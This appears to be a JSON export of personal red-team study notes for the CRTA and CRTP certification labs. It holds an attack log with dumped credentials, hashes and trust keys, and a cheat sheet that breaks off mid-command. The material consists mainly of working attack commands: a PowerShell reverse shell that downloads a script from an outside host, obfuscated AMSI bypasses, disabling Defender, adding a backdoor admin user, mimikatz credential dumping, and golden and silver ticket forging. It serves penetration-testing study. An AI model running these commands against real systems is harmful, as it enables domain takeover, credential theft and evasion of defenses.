[
  {
    "slug": "01-CRTA/01-POC",
    "path": "01-CRTA/01-POC.md",
    "title": "01 POC",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Web page 10.10.10.3:1000 !WEB page `bash msfadmin@Production-Server:/home/prod-admin$ cat credential.txt  Support User Credential: User : support Pass : support@123 Prod-admin Credential:  User: prod-...",
    "category": "01-CRTA",
    "content": "## Web page 10.10.10.3:1000\n\n![WEB page](https://i.imgur.com/IbU2Zhv.png)\n\n\n```bash\nmsfadmin@Production-Server:/home/prod-admin$ cat credential.txt \nSupport User Credential:\nUser : support\nPass : support@123\n\n\n\nProd-admin Credential: \n\nUser: prod-admin\nPass: Pr0d!@#$%\n\n```\n\n![](https://i.imgur.com/zkpuYz0.png)\n\n\n![](https://i.imgur.com/8NvXGA0.png)\n\n\n![](https://i.imgur.com/1j8HCSf.png)\n\n\n![](https://i.imgur.com/88H1OcS.png)\n\n\n![](https://i.imgur.com/EtI7qoH.png)\n\n```\n╭─kali@kali ~/Desktop/CRTA/KeyTabExtract ‹master› \n╰─$ python3 keytabextract.py ../child-admin.keytab                                                                                                                                                          1 ↵\n[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.\n[!] Unable to identify any AES256-CTS-HMAC-SHA1 hashes.\n[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.\n[+] Keytab File successfully imported.\n        REALM : CHILD.REDTEAM.CORP\n        SERVICE PRINCIPAL : child-admin/\n        NTLM HASH : dbac2b57a73bb883422658d2aea36967\n\n```\n\n![](https://i.imgur.com/18N7cub.png)\n\n![](https://i.imgur.com/rD8mBeg.png)\n\n\n## Local administrator\n\n![](https://i.imgur.com/YbNkZBT.png)\n\ninvoke-mimikatz -Command \n\n![](https://i.imgur.com/AIxfkun.png)\n\n\n\n## Domain Trust\n\n![](https://i.imgur.com/h6HerOD.png)\n\n\n![](https://i.imgur.com/0MZJI8n.png)\n\n```bash\n*Evil-WinRM* PS C:\\users\\public> Get-ADDomain -Server CHILD.REDTEAM.CORP\n\n\nAllowedDNSSuffixes                 : {}\nChildDomains                       : {}\nComputersContainer                 : CN=Computers,DC=child,DC=redteam,DC=corp\nDeletedObjectsContainer            : CN=Deleted Objects,DC=child,DC=redteam,DC=corp\nDistinguishedName                  : DC=child,DC=redteam,DC=corp\nDNSRoot                            : child.redteam.corp\nDomainControllersContainer         : OU=Domain Controllers,DC=child,DC=redteam,DC=corp\nDomainMode                         : Windows2016Domain\nDomainSID                          : S-1-5-21-2332039752-785340267-2377082902\nForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=child,DC=redteam,DC=corp\nForest                             : redteam.corp\nInfrastructureMaster               : RED-CHILDDC.child.redteam.corp\nLastLogonReplicationInterval       :\nLinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=child,DC=redteam,DC=corp}\nLostAndFoundContainer              : CN=LostAndFound,DC=child,DC=redteam,DC=corp\nManagedBy                          :\nName                               : child\nNetBIOSName                        : CHILD\nObjectClass                        : domainDNS\nObjectGUID                         : 3917ed3d-58c1-4dcf-ac50-cc1500f879dc\nParentDomain                       : redteam.corp\nPDCEmulator                        : RED-CHILDDC.child.redteam.corp\nPublicKeyRequiredPasswordRolling   : True\nQuotasContainer                    : CN=NTDS Quotas,DC=child,DC=redteam,DC=corp\nReadOnlyReplicaDirectoryServers    : {}\nReplicaDirectoryServers            : {RED-CHILDDC.child.redteam.corp}\nRIDMaster                          : RED-CHILDDC.child.redteam.corp\nSubordinateReferences              : {DC=DomainDnsZones,DC=child,DC=redteam,DC=corp}\nSystemsContainer                   : CN=System,DC=child,DC=redteam,DC=corp\nUsersContainer                     : CN=Users,DC=child,DC=redteam,DC=corp\n\n```\n\n\n\n```\nInvoke-Mimikatz -Command '\"lsadump::trust /patch\"'\n```\nInvoke-Mimikatz -Command '\"privilege::debug\" \"lsadump::lsa /patch\"'\n\n\n```bash\n*Evil-WinRM* PS C:\\users\\public> Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(powershell) # lsadump::trust /patch\n\nCurrent domain: CHILD.REDTEAM.CORP (CHILD / S-1-5-21-2332039752-785340267-2377082902)\n\nDomain: REDTEAM.CORP (REDTEAM / S-1-5-21-1882140339-3759710628-635303199)\n [  In ] CHILD.REDTEAM.CORP -> REDTEAM.CORP\n    * 10/19/2024 12:44:46 PM - CLEAR   - d5 db 79 9f 12 f0 4d e8 4f 12 c2 b6 96 f0 c4 da eb 8b 89 47 b2 76 19 a9 b0 e5 0a 7a 3e 9e 7c 36 e5 65 eb 95 46 0d 25 d1 2c 1d 5a 48 37 4b 72 ec 20 b2 9b a4 c4 4d 44 86 93 72 82 b2 41 f6 d5 4f e8 cf e0 30 e2 33 1b 5d 56 00 cb 63 94 2c 10 14 28 33 b5 da 94 d1 6f d3 e6 49 0c 5c 9d 9b ac 74 6c fe ee 00 0a 3a 44 71 b8 5f cc 29 28 1b f5 9e 28 9e 4c 8a 61 e4 58 66 3e 36 f0 f9 98 aa 77 ee b1 55 f0 f9 79 44 84 e1 f3 51 b7 85 e1 2d cd 5c ea 5c 71 e0 c2 eb b9 20 8b bb 27 18 9a 0f 82 9b 69 37 eb a6 59 fb de 38 f5 a5 24 0a d6 c1 0c 30 ac 2f c3 0a 5b 0d 4a ff 35 0f 81 c3 96 98 d9 e9 54 c3 58 45 fc 78 1e af cf 03 55 41 26 bf 1d be 46 56 c5 02 1c 9f 6f 58 c2 13 c5 83 a7 d1 7a 14 5a 3d 1d 00 5d a1 6a 86 f1 12 06 ac 64 4f 95 e1\n        * aes256_hmac       0748785c6a6c62a8949e4e0e58a2bb8ae3a79706e95bbc68d5e4bd6f2f049bc4\n        * aes128_hmac       cf2fcb01c6bcba1b90d56b852b93a087\n        * rc4_hmac_nt       cecc2c98ff3bc5657f8b468f7779da25\n\n [ Out ] REDTEAM.CORP -> CHILD.REDTEAM.CORP\n    * 10/19/2024 12:55:08 PM - CLEAR   - 10 1d 0b b9 fb 4f 29 f0 1b f7 a6 f4 49 57 9e 14 62 48 eb 1a bd 32 03 0b ef 14 37 37 5c 2f fb 16 26 2f aa 45 3c 6e d7 b6 97 62 28 23 ab 12 ad 33 b4 8d 66 1f 5d 87 d3 89 a9 1d 2d 89 b4 8b 7e 8d 8a 8b bc a6 9c a1 c9 06 44 b7 10 ed e4 64 bc 4f 73 c8 39 5f 2c ac 18 c9 43 ea 90 98 cb fe 4a 22 db ca c4 b3 ef 69 ca cf 23 f8 6b d5 d8 95 b6 32 0e 1d 17 13 cf c2 b0 cd 17 0e 09 92 bc 23 5e 43 ba f5 1e 35 77 ef 86 76 2b 8b e4 40 25 00 01 3f e4 69 6c 1f 17 6e 0d e5 3d e1 c8 8c f7 76 4b 68 36 81 b2 d4 3e a6 7d 50 99 8a 1a ea 60 3a 43 6d 41 73 22 d3 88 77 13 77 dd 00 ed 8b e8 22 71 59 48 5b 40 88 72 ae f2 f6 63 e9 7e 82 36 bd 24 ae 8a f3 34 8d cb 6e fd b5 a1 67 20 4c 82 de 78 f8 53 fa c1 13 e5 59 27 89 f8 1c ac d2 9e 4e 2c 85\n        * aes256_hmac       e623a39ec7687d68e4355f54bed28932d4c80864230653df523d2f6faef8158d\n        * aes128_hmac       d8abd147caf2cf4d5f8a636da26ea274\n        * rc4_hmac_nt       634b083a2c68ccd1d087f83a934b9d47\n\n [ In-1] CHILD.REDTEAM.CORP -> REDTEAM.CORP\n    * 11/29/2021 12:45:02 PM - CLEAR   - 29 8c 95 c5 b9 2d fa 99 51 2d d3 e5 c4 3c 5a 36 32 3b 8e 8b b2 2e cb 53 09 a1 35 e4 b1 f7 96 52 b7 c4 ce 45 9b c2 14 1c f0 ea 66 f1 b7 ce 0f fa d2 6d 83 de 45 6c 21 94 98 41 08 a0 52 5b 05 c8 7c dd 36 fa 04 77 81 83 12 77 3d f1 a2 32 df 38 0d 9f 37 f0 56 85 2a bd 72 22 5b 00 da 0c a9 17 f0 3a 60 38 ab 34 b5 be be 45 9a 41 40 48 27 8c fc 3b 85 df fa ee 09 3c 39 b6 aa be 64 76 8e 6d 1f 2b 00 90 78 7b d1 34 83 14 b9 e5 af e4 34 e1 3c 6c fb ec f7 2d 27 c5 97 4a ac 50 b3 fc 07 b5 be 6a 8c f1 a8 34 43 5b 7e 51 4f 6e c3 6e 8b 17 0a d0 3d c4 61 a6 01 29 db e9 dc e7 5b 49 33 ba f9 4a d9 0b fb 6f 73 6c d9 9a b5 ea fd 91 6e 7c 93 cc 35 b0 cd 50 f2 ea 83 f5 b5 20 a8 3d 6b ce 3a 03 1a e8 ff 0a 78 e9 87 0a ca 76 92 d0 21 cb\n        * aes256_hmac       ae08ecf82764ff7b5fb80fc92e27bfe4a355ac64659dc93f817cae2c6a77c066\n        * aes128_hmac       5192b3e4c0b4eb0b9a21231de5a81eba\n        * rc4_hmac_nt       c7f4d70548474883ce10b95b22c35bd1\n\n [Out-1] REDTEAM.CORP -> CHILD.REDTEAM.CORP\n    * 10/19/2024 12:55:08 PM - CLEAR   - ad a6 67 07 3f d5 f0 78 53 55 79 dc a9 24 22 6a 88 0f 64 a1 01 a8 f8 50 24 fe dd b7 23 96 75 35 1d 9f 72 dc b6 7b 6e 2a da c3 57 ff 90 4f 37 79 bf da c7 39 ce 0c 25 d8 d0 1c bc a5 13 b8 2f 3a 47 66 2c af 9d 6a fb e8 d7 ba 3f a0 7e 20 80 e2 27 a8 66 ad 95 1a 14 75 5c 69 e8 fd 4c 39 dc 23 bc d4 42 09 71 1c ce 77 e9 15 4b 01 7a 44 12 d6 d0 92 b7 86 b2 1d 70 3b cf 1f 9a 4e fa 6f 2b b4 8a c7 63 1d bf 69 f5 ec 03 b2 77 51 09 70 95 65 cd 47 1f 3d 3f 31 2e c2 70 c4 45 3e e2 f4 ae 23 70 a8 78 27 54 f6 c0 02 e1 49 8b 42 9f 86 60 2f 6b 69 00 1f 9a 87 5c 73 71 08 9a 77 9f 9c fc 85 53 54 ef b3 29 6c fa 64 c8 af bd 6d 52 f1 22 71 6f 91 26 c2 8d 60 cb 27 7f 9e 23 c9 d6 19 4c c7 4a c7 1a 25 86 af 55 2b 53 0d a7 21 42 bc 8c dc\n        * aes256_hmac       c38d1b5791d599a4dc9943d2db4e8f1b66eb1e596c0cf8490aba822cbe59ed0b\n        * aes128_hmac       519d5fe1b4530ad78f7e4a7ff7339f12\n        * rc4_hmac_nt       8d8c4ece21b2b83168983136ecdc8c53\n\n```\n\n\n![](https://i.imgur.com/Oir4k3l.png)\n\n![](https://i.imgur.com/WAPV2NY.png)\n\n\n```\n.\\mimikatz.exe privilege::debug 'kerberos::golden /user:child-admin /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-63530319-519 /rc4:cecc2c98ff3bc5657f8b468f7779da25 /service:krbtgt /target:redteam.corp /ticket:C:\\users\\public\\ticket.kirbi\n```\n\n```\n.\\Rubeus.exe asktgs /ticket:C:\\users\\public\\ticket.kirbi /service:cifs/red-dc.redteam.corp /dc:red-dc.redteam.corp /ptt\n```\n\n```\n.\\Rubeus.exe asktgs /ticket:C:\\users\\public\\ticket.kirbi /service:http/red-dc.redteam.corp /dc:red-dc.redteam.corp /ptt\n```\n\n![](https://i.imgur.com/lwAK00B.png)\n\n\n![](https://i.imgur.com/UnMkxEq.png)\n\n\n\n```\n.\\mimikatz.exe privilege::debug 'kerberos::golden /user:administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-63530319-519 /rc4:cecc2c98ff3bc5657f8b468f7779da25 /startoffset:-5 /endin:600 /renew:10080 /ptt\n```\n\n![](https://i.imgur.com/3yZYQPv.png)\n",
    "frontmatter": {}
  },
  {
    "slug": "01-CRTA/02-cred",
    "path": "01-CRTA/02-cred.md",
    "title": "02 Cred",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "`bash krbtgt : 24dd6646fd7e11b60b6a9508e6fe7e5a `",
    "category": "01-CRTA",
    "content": "```bash\nkrbtgt : 24dd6646fd7e11b60b6a9508e6fe7e5a\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/01- Cheet sheet",
    "path": "02-CRTP/01- Cheet sheet.md",
    "title": "01  Cheet Sheet",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "CRTP-cheatsheet Summary * General     * Powerview Domain     * Powerview Users, groups and computers      * Powerview Shares     * Powerview GPO     * Powerview ACL     * Powerview Domain Trust     * ...",
    "category": "02-CRTP",
    "content": "# CRTP-cheatsheet\n\n# Summary\n* [General](#General)\n    * [Powerview Domain](##Powerview Domain)\n    * [Powerview Users, groups and computers](#Powerview-users-groups-and-computers) \n    * [Powerview Shares](#Powerview-shares)\n    * [Powerview GPO](#Powerview-GPO)\n    * [Powerview ACL](#Powerview-ACL)\n    * [Powerview Domain Trust](#Powerview-Domain-Trust)\n    * [Misc](#misc) \n* [Local privilege escalation](#Local-privilege-escalation)\n* [Lateral Movement](#Lateral-Movement)\n   * [General](#General) \n   * [Mimikatz](#Mimikatz) \n* [Domain Persistence](#Domain-Persistence)\n   * [Golden Ticket](#Golden-Ticket) \n   * [Silver Ticket](#Silver-Ticket)\n   * [Skeleton Key](#Skeleton-Key)\n   * [DSRM](#DSRM)\n   * [Custom SSP - Track logons](#Custom-SSP---Track-logons)\n   * [ACL](#ACL)\n      * [AdminSDHolder](#AdminSDHolder)\n      * [DCsync](#DCsync)\n      * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)\n      * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)\n      * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)\n* [Domain privilege escalation](#Domain-privilege-escalation)\n   * [Kerberoast](#Kerberoast) \n   * [AS-REPS Roasting](#AS-REPS-Roasting) \n   * [Set SPN](#Set-SPN) \n   * [Unconstrained Delegation](#Unconstrained-delegation) \n   * [Constrained Delegation](#Constrained-delegation) \n   * [DNS Admins](#DNS-Admins) \n   * [Abuse SQL](#Abuse-SQL) \n   * [Enterprise Admins](#Enterprise-Admins) \n      * [Child to parent - Trust tickets](#Child-to-parent---Trust-tickets)\n      * [Child to parent - krbtgt hash](#Child-to-parent---krbtgt-hash)\n   * [Crossforest attacks](#Crossforest-attacks)\n      * [Trust flow](#Trust-flow) \n      \n   \n# General\n#### Access C disk of a computer (check local admin)\n```\nls \\\\<computername>\\c$\n```\n\n#### Use this parameter to not print errors powershell\n```\n-ErrorAction SilentlyContinue\n```\n\n#### Rename powershell windows\n```\n$host.ui.RawUI.WindowTitle = \"<naam>\"\n```\n\n#### Impacket PSexec impacket\nIf no LM Hash use an empty one: ```aad3b435b51404eeaad3b435b51404ee```\n```\npython3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>\npython3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>\n```\n\n# Domain Enumeration\n## Powerview Domain\nhttps://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\n```\n. ./PowerView.ps1\n```\n\n#### Get current domain\n```\nGet-NetDomain\n```\n\n#### Get object of another domain\n```\nGet-NetDomain -Domain <domainname>\n```\n\n#### Get Domain SID for the current domain\n```\nGet-DomainSID\n```\n\n#### Get the domain password policy\n```\nGet-DomainPolicy\n(Get-DomainPolicy).\"System Access\"\nnet accounts\n```\n\n## Powerview users groups and computers\n#### Get Information of domain controller\n```\nGet-NetDomainController\nGet-NetDomainController | select-object Name\n```\n\n#### Get information of users in the domain\n```\nGet-NetUser\nGet-NetUser -Username <username>\n```\n\n#### Get list of all users\n```\nGet-NetUser | select samaccountname\n```\n\n#### Get list of usernames, last logon and password last set\n```\nGet-NetUser | select samaccountname, lastlogon, pwdlastset\nGet-NetUser | select samaccountname, lastlogon, pwdlastset | Sort-Object -Property lastlogon\n```\n\n#### Get list of usernames and their groups\n```\nGet-NetUser | select samaccountname, memberof\n```\n\n#### Get list of all properties for users in the current domain\n```\nget-userproperty -Properties pwdlastset\n```\n\n#### Get descripton field from the user\n```\nFind-UserField -SearchField Description -SearchTerm \"built\"\nGet-netuser | Select-Object samaccountname,description\n```\n\n#### Get computer information\n```\nGet-NetComputer\nGet-NetComputer -FullData\nGet-NetComputer -Computername <computername> -FullData\n```\n\n#### Get computers with operating system \"\"\n```\nGet-NetComputer -OperatingSystem \"*Server 2016*\"\n```\n\n#### Get list of all computer names and operating systems\n```\nGet-NetComputer -fulldata | select samaccountname, operatingsystem, operatingsystemversion\n```\n\n#### List all groups of the domain\n```\nGet-NetGroup\nGet-NetGroup -GroupName *admin*\nGet-NetGroup -Domain <domain>\n```\n\n#### Get all the members of the group\n```\nGet-NetGroupMember -Groupname \"Domain Admins\" -Recurse\nGet-NetGroupMember -Groupname \"Domain Admins\" -Recurse | select MemberName\n```\n\n#### Get the group membership of a user\n```\nGet-NetGroup -Username <username>\n```\n\n#### List all the local groups on a machine (needs admin privs on non dc machines)\n```\nGet-NetlocalGroup -Computername <computername> -ListGroups\n```\n\n#### Get Member of all the local groups on a machine (needs admin privs on non dc machines)\n```\nGet-NetlocalGroup -Computername <computername> -Recurse\n```\n\n#### Get actively logged users on a computer (needs local admin privs)\n```\nGet-NetLoggedon -Computername <computername>\n```\n\n#### Get locally logged users on a computer (needs remote registry rights on the target)\n```\nGet-LoggedonLocal -Computername <computername>\n```\n\n#### Get the last logged users on a computer (needs admin rights and remote registary on the target)\n```\nGet-LastLoggedOn -ComputerName <computername>\n```\n\n## Powerview shares\n#### Find shared on hosts in the current domain\n```\nInvoke-ShareFinder -Verbose\nInvoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC\n```\n\n#### Find sensitive files on computers in the domain\n```\nInvoke-FileFinder -Verbose\n```\n\n#### Get all fileservers of the domain\n```\nGet-NetFileServer\n```\n\n## Powerview GPO\n#### Get list of GPO's in the current domain\n```\nGet-NetGPO\nGet-NetGPO -Computername <computername>\n```\n\n#### Get GPO's which uses restricteds groups or groups.xml for interesting users\n```\nGet-NetGPOGroup\n```\n\n#### Get users which are in a local group of a machine using GPO\n```\nFind-GPOComputerAdmin -Computername <computername>\n```\n\n#### Get machines where the given user is member of a specific group\n```\nFind-GPOLocation -Username student244 -Verbose\n```\n\n#### Get OU's in a domain\n```\nGet-NetOU -Fulldata\n```\n\n#### Get machines that are part of an OU\n```\nGet-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}\n```\n\n#### Get GPO applied on an OU\ngplink from Get-NetOU -Fulldata\n```\nGet-NetGPO -GPOname \"{<gplink>}\"\n```\n\n## Powerview ACL\n#### Get the ACL's associated with the specified object\n```\nGet-ObjectACL -SamAccountName <accountname> -ResolveGUIDS\n```\n\n#### Get the ACL's associated with the specified prefix to be used for search\n```\nGet-ObjectACL -ADSprefix ‘CN=Administrator,CN=Users’ -Verbose\n```\n\n#### Get the ACL's associated with the specified path\n```\nGet-PathAcl -Path \\\\<Domain controller>\\sysvol\n```\n\n#### Search for interesting ACL's\n```\nInvoke-ACLScanner -ResolveGUIDs\nInvoke-ACLScanner -ResolveGUIDs | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl\n```\n\n#### Search of interesting ACL's for the current user\n```\nInvoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}\n```\n\n## Powerview Domain trust\n#### Get a list of all the domain trusts for the current domain\n```\nGet-NetDomainTrust\n```\n\n#### Get details about the forest\n```\nGet-NetForest\n```\n\n#### Get all domains in the forest\n```\nGet-NetForestDomain\nGet-NetforestDomain -Forest <domain name>\n```\n\n#### Get global catalogs for the current forest\n```\nGet-NetForestCatalog\nGet-NetForestCatalog -Forest <domain name>\n```\n\n#### Map trusts of a forest\n```\nGet-NetForestTrust\nGet-NetForestTrust -Forest <domain name>\nGet-NetForestDomain -Verbose | Get-NetDomainTrust\n```\n\n## Misc\n####  Powerview Find all machines on the current domain where the current user has local admin access\n```\nFind-LocalAdminAccess -Verbose\n```\n\n```\n. ./Find-WMILocalAdminAccess.ps1\nFind-WMILocalAdminAccess\n```\n\n```\n. ./Find-PSRemotingLocalAdminAccess.ps1\nFind-PSRemotingLocalAdminAccess\n```\n\n####  Powerview Find local admins on all machines of the domain (needs admin privs)\n```\nInvoke-EnumerateLocalAdmin -Verbose\n```\n\n#### Connect to machine with administrator privs\n```\nEnter-PSSession -Computername <computername>\n```\n\n#### Save and use sessions of a machine\n```\n$sess = New-PSSession -Computername <computername>\nEnter-PSSession $sess\n```\n\n####  Find active sessions\n```\nInvoke-UserHunter\nInvoke-UserHunter -Groupname \"RDPUsers\"\n```\n\n####  Find active sessions of domain admins\n```\nInvoke-UserHunter -Groupname \"Domain Admins\"\n```\n\n####  check access to machine\n```\nInvoke-UserHunter -CheckAccess\n```\n\n####  BloodHound\nhttps://github.com/BloodHoundAD/BloodHound\n```\ncd Ingestors\n. ./sharphound.ps1\nInvoke-Bloodhound -CollectionMethod all -Verbose\nInvoke-Bloodhound -CollectionMethod LoggedOn -Verbose\n\n#Copy neo4j-community-3.5.1 to C:\\\n#Open cmd\ncd C:\\neo4j\\neo4j-community-3.5.1-windows\\bin\nneo4j.bat install-service\nneo4j.bat start\n#Browse to BloodHound-win32-x64\nRun BloodHound.exe\n#Change credentials and login\n```\n\n####  Powershell reverse shell\n```\nPowershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000\n```\n\n# Local privilege escalation\nFocussing on Service issues\n#### Privesc check all\nhttps://github.com/enjoiz/Privesc\n```\n. .\\privesc.ps1\nInvoke-PrivEsc\n```\n\n#### Beroot check all\nhttps://github.com/AlessandroZ/BeRoot\n```\n./beRoot.exe\n```\n\n####  Run powerup check all\nhttps://github.com/HarmJ0y/PowerUp\n\n```\n. ./powerup\nInvoke-allchecks\n```\n\n####  Run powerup get services with unqouted paths and a space in their name\n```\nGet-ServiceUnquoted -Verbose\nGet-ModifiableServiceFile -Verbose\n```\n\n####  Abuse service to get local admin permissions with powerup\n```\nInvoke-ServiceAbuse\nInvoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\\<username>'\n```\n\n####  Jekins\n```\nRuns as local admin, go to /job/project/configure to try to see if you have build permissions in /job/project0/configure\nExecute windows or shell comand into the build, you can also use powershell scripts\n```\n\n### Add user to local admin and RDP group and enable RDP on firewall\n```\nnet user <username> <password> /add /Y   && net localgroup administrators <username> /add   && net localgroup \"Remote Desktop Users\" <username> /add && reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\n```\n\n# Lateral Movement\n## General\n#### Connect to machine with administrator privs\n```\nEnter-PSSession -Computername <computername>\n$sess = New-PSSession -Computername <computername>\nEnter-PSSession $sess\n```\n\n#### Execute commands on a machine\n```\nInvoke-Command -Computername <computername> -Scriptblock {whoami} \nInvoke-Command -Scriptblock {whoami} $sess\n```\n\n#### Load script on a machine\n```\nInvoke-Command -Computername <computername> -FilePath <path>\nInvoke-Command -FilePath <path> $sess\n```\n\n#### Download and load script on a machine\n```\niex (iwr http://xx.xx.xx.xx/<scriptname> -UseBasicParsing)\n```\n\n#### AMSI Bypass\n- First one gets detected, added a new one!\n```\nsET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),( \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"( ${n`ULl},${t`RuE} )\n```\n\n```\n$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v.\"Get`Fie`ld\"('ams' + 'iInitFailed','NonPublic,Static').\"Set`Val`ue\"($null,$true)\n```\n\n```\nInvoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL ).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),( \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"( ${n`ULl},${t`RuE} )} $sess\n```\n\n#### Disable AV monitoring\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\n```\n\n#### Execute locally loaded function on a list of remote machines\n```\nInvoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content <list_of_servers>)\nInvoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content <list_of_servers>)\n```\n\n#### Check the language mode\n```\n$ExecutionContext.SessionState.LanguageMode\n```\n\n#### Enumerate applocker policy\n```\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n```\n\n#### Copy script to other server\nps you can edit the script and call the method you wish so it executes, since you still cant load it in\n```\nCopy-Item .\\Invoke-MimikatzEx.ps1 \\\\<servername>\\c$\\'Program Files'\n```\n\n## Mimikatz\n#### Mimikatz dump credentials on local machine\n```\nInvoke-Mimikatz -Dumpcreds\n```\n\n#### Mimikatz dump credentials on multiple remote machines\n```\nInvoke-Mimikatz -Dumpcreds -Computername @(“<system1>”,”<system2>”)\nInvoke-Mimikatz -Dumpcreds -ComputerName @(\"<computername 1>\",\"<computername 2>\")\n```\n\n#### Mimikatz start powershell pass the hash (run as local admin)\n```\nInvoke-Mimikatz -Command '\"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm hash> /run:powershell.exe\"'\n```\n\n#### Mimikatz dump from SAM\n```\nInvoke-Mimikatz -Command '\"privilege::debug\" \"token::elevate\" \"lsadump::sam\"'\n```\n\nor\n\n```\nreg save HKLM\\SAM SamBkup.hiv\nreg save HKLM\\System SystemBkup.hiv\n#Start mimikatz as administrator\nprivilege::debug\ntoken::elevate\nlsadump::sam SamBkup.hiv SystemBkup.hiv\n```\n\n#### Mimikatz dump lsa (krbtgt to)\n```\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -Computername <computername>\n```\n\n# Domain persistence\n## Golden ticket\nGolden tickets zijn nagemaakte TGT tickets. TGT tickets worden gebruikt om TGS tickets aan te vragen bij de KDC(DC). De kerberos Golden Ticket is een valid TGT omdat deze ondertekend is door het KRBTGT account. Als je de hash van de KRBTGT account kan achterhalen door de hashes te dumpen op de Domain controller en deze hash niet wijzigt is het mogelijk om weer een TGT aan te vragen bij de volgende penetratietest en volledige toegang tot het domein te verkrijgen.\n\nhttps://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets\n\n#### Dump hashes - Get the krbtgt hash\n```\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -Computername <computername>\n```\n\n#### Make golden ticket\nUse /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process\nTo get the SID use ```Get-DomainSID``` from powerview\n```\nInvoke-Mimikatz -Command '\"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'\n```\n\n#### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges\n```\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:<domain>\\krbtgt\"'\n```\n\n#### Check WMI Permission\n```\nGet-wmiobject -Class win32_operatingsystem -ComputerName <computername>\n```\n\n## Silver ticket\nSilver tickets zijn nagemaakte TGS tickets. Omdat de ticket is nagemaakt op de workstation is er geen communicatie met de DC. Eeen silver ticket kan worden aangemaakt met de service account hash of computer account hash.\n\nhttps://adsecurity.org/?p=2011\nhttps://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets\n\n#### Make silver ticket for CIFS\nUse the hash of the local computer\n```\nInvoke-Mimikatz -Command '\"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt\"'\n```\n\n#### Check access (After CIFS silver ticket)\n```\nls \\\\<servername>\\c$\\\n```\n\n#### Make silver ticket for Host\n```\nInvoke-Mimikatz -Command '\"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt\"'\n```\n\n#### Schedule and execute a task (After host silver ticket)\n```\nschtasks /create /S <target> /SC Weekly /RU \"NT Authority\\SYSTEM\" /TN \"Reverse\" /TR \"powershell.exe -c 'iex (New-Object 